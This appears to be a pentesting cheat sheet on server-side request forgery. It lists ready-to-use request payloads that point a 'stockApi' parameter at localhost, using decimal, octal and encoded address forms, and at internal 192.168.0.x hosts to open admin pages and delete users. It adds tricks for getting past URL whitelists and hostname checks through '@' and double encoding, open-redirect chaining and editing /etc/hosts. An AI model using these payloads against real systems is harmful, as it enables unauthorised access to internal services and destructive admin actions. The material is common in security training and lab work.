---
title: Server-Side Request Forgery (SSRF)
desc: 
tags: [SSRF, Web]
alts: []
render_with_liquid: false
---

## Basic Methodology

1. **Localhost**

    ```html
    POST /stock HTTP/1.1
    ...

    stockApi=http://localhost/
    ```

    The followings are alternatives for localhost.

    ```
    stockApi=http://127.0.0.1/
    stockApi=http://2130706433/
    stockApi=http://017700000001/
    stockApi=http://127.1/
    ```

    - **Operation as Administrator**

        ```
        stockApi=http://localhost/admin
        stockApi=http://localhost/admin/delete?username=john

        stockApi=http://127.1/%25%36%31dmin
        ```

2. **Backund URL (192.168.0.X)**

    ```
    stockApi=http://192.168.0.23/admin
    stockApi=http://192.168.0.68:8080/admin/delete?username=michael
    ```

3. **Bypass Whitelisted URL**

    ```
    stockApi=http://localhost@vulnerable.com/
    stockApi=http://localhost%25%32%33@vulnerable.com/
    ```

4. **Open Redirect**

    ```
    stockApi=/post/next?path=http://localhost/admin
    ```

5. **Bypass Hostname**

    1. **Add Target Domain to /etc/hosts in Local Machine**

        ```sh
        <target-ip> sub.vulnerable.com
        ```

        Restart hostnamed

        ```sh
        sudo systemctl restart systemd-hostnamed
        ```

    2. **Access to the Domain You Specified**

        ```
        https://vulnerable.com/?proxy=https://sub.vulnerable.com
        ```


